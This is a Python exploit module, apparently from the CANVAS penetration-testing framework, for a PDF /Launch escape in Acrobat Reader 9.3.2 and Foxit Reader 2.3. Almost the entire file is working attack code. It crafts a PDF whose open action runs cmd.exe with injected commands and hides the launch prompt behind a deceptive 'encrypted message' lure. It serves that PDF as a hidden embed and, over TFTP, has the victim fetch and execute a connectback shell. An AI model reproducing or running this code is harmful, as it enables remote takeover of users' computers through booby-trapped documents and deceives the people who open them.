#! /usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
if '.' not in sys.path: sys.path.append('.')

import os
import getopt
import canvasengine
from MOSDEF import mosdef

from libs.pyPdf.pdf import *
from libs.pyPdf.generic import *
from libs.pyPdf.filters import *

from threading import *
from exploitutils import *
from libs.canvasos import *
from httpclientside import httpclientside
from ExploitTypes.CommandLineExecuter import CommandExploit


NAME='Acrobat/Foxit Reader PDF escape'
DESCRIPTION='Acrobat/Foxit Reader PDF escape'

DOCUMENTATION={}
DOCUMENTATION['Date public']='03/29/2010'
DOCUMENTATION['References']=''
DOCUMENTATION['Repeatability']='Infinite'
DOCUMENTATION['VersionsAffected']='Acrobat Reader <=9.3.2, Foxit Reader <=2.3'
DOCUMENTATION['CVE Name']='N/A'
DOCUMENTATION["CVE Url"]=""
DOCUMENTATION["Notes"]="""
With Adobe Reader, the user gets a warning asking for approval to launch the action, its possible to partially control the message displayed by the dialog.
Foxit Reader displays no warning at all, the action gets executed without user interaction.

This exploit will start a TFTP server (which is why it requires root) and have the remote side download and execute a MOSDEF connectback'

Ex: (as root)
./exploits/clientd/clientd.py -l 192.168.1.10 -d 5555 -O server_port:8080 -O allowed_attack_modules:acrobat_exec
./commandlineInterface.py -v1 -p5555


Tested on Windows XP Professional SP3 English/Spanish with Adobe Acrobat Reader 9.3.2 and Foxit Reader 2.3
"""

VERSION='0.2'

PROPERTY={}
PROPERTY['TYPE']='Exploit'
PROPERTY['SITE']='Clientside'
PROPERTY['ARCH']=[['Windows']]
PROPERTY['VERSION']=['NT','2000','XP','2003']
PROPERTY['VENDOR']='Adobe'
PROPERTY['DELIVERY']='HTTP'

NOTES="""
"""

CHANGELOG="""
"""

DEBUGNOTES="""
"""

targets={
    0: ['Autodetect',0],
}


class theexploit(CommandExploit,httpclientside):

    def __init__(self):
        httpclientside.__init__(self)
        self.name=NAME
        self.setInfo(DESCRIPTION)

        #http
        self.clientversion=1
        self.badstring='\0\xff'
        self.htmlfilename='file.html'
        self.refresh_rate=300
        self.HTTPMOSDEF=True

        #??
        self.listen_port=5555

        # CommandExploit params
        self.max_command_length=100
        self.capabilities=["tftp"]
        self.win32WritableDirs=["%TEMP%\\","\\winnt\\temp\\","c:\\winnt\\temp\\","\\WINDOWS\\TEMP\\","c:\\","d:\\"]

        self.multi = 0
        self.startTFTP = 1

        #PDF
        self.source_pdf     = 'Resources/blank.pdf'
        self.dest_pdf       = 'output.pdf'
        self.command		= 'cmd.exe'
        self.message        = 'To view the encrypted message in this PDF document, click Open button.\n\n'

        return


    def makePDF(self,parameters):

        input = PdfFileReader(file(self.source_pdf,'rb'))
        page=input.getPage(0)

        parameters = parameters.replace("\\","\\\\")

        trojan = parameters.split(" ")
        trojan = trojan.pop()

        input.trailer['/Root'][NameObject("/OpenAction")] = DictionaryObject()
        input.trailer['/Root']["/OpenAction"][NameObject("/Type")] = NameObject("/Action")
        input.trailer['/Root']["/OpenAction"][NameObject("/S")] = NameObject("/Launch")
        input.trailer['/Root']["/OpenAction"][NameObject("/Win")] = DictionaryObject()
        input.trailer['/Root']["/OpenAction"]["/Win"][NameObject("/F")] = NameObject('('+self.command+')')
        input.trailer['/Root']["/OpenAction"]["/Win"][NameObject("/D")] = NameObject('('+ "c:\\windows\\system32" +')')
        input.trailer['/Root']["/OpenAction"]["/Win"][NameObject("/P")] = NameObject('('+ "/C " + parameters + " & (start " + trojan +")" + ('\n' * 10) + self.message + ')')


        self.writeOutput(input, self.dest_pdf)

        return file(self.dest_pdf,'rb').read()

    def writeOutput(self,input, filename):
        page=input.getPage(0)
        output=PdfFileWriter(Insert=True)
        output.addPage(page)
        root = output._root.getObject()
        root.update(input.trailer['/Root'])
        output.write(file(filename,'wb'))

        return


    def buildConnectionList(self):
        host=self.host
        connectionList=['ncacn_ip_tcp:%s[%d]'%(host,self.port)]
        self.connectionList=connectionList
        return self.connectionList


    def neededListenerTypes(self):
        return [canvasengine.WIN32MOSDEF]

    def run(self):
        self.log("Please run me from ClientD")
        return 0


    def displayVersions(self):
        i=0
        print 'Available versions:'
        for listline in targets.values():
            print '\t%d: %s'%(i,listline[0])
            i+=1

    def run_command(self, cmd, blind=0):
        self.makePDF(cmd)
        return 1


    def test(self):
        newos=canvasos()
        newos.arch="X86"
        newos.base="Windows"
        newos.version="XP"
        self.target_os=newos

        return 1


    def makeHTML(self):
        webpage="<HTML>\n"
        webpage+="<EMBED src=\"%s\" HIDDEN=\"TRUE\" ></EMBED>\n"%(self.dest_pdf)
        webpage+="</HTML>\n"
        return webpage


    def makesploit(self,clientheader,clientbody):

        self.test()
        if self.startTFTP == 1:
            t = Thread(target=self.upload_and_execute)
            t.start()
            self.startTFTP = 0

        time.sleep(3)

        from libs.spkproxy import header,body
        h=header('SERVER')
        b=body()
        if clientheader.URL.count(self.htmlfilename):
            self.log('Serving HTML file')
            b.setBody(self.makeHTML())
            h.addHeader('Content-Type','text/html')
        elif clientheader.URL.count(self.dest_pdf):
            self.log('Serving PDF file')
            h.addHeader('Content-Type','application/pdf')
            b.setBody(file(self.dest_pdf,'rb').read())
        else:
            self.log('redirecting to self')
            h.status='302'
            h.addHeader('Location',self.htmlfilename)
            h.addHeader('Content-Type','text/html')
        return h,b


if __name__=='__main__':
    print 'Running CANVAS %s Exploit v%s'%(DESCRIPTION,VERSION)
    app=theexploit()

    ret=standard_callback_commandline(app)
    if ret not in [0,1,None]:
        ret.interact()
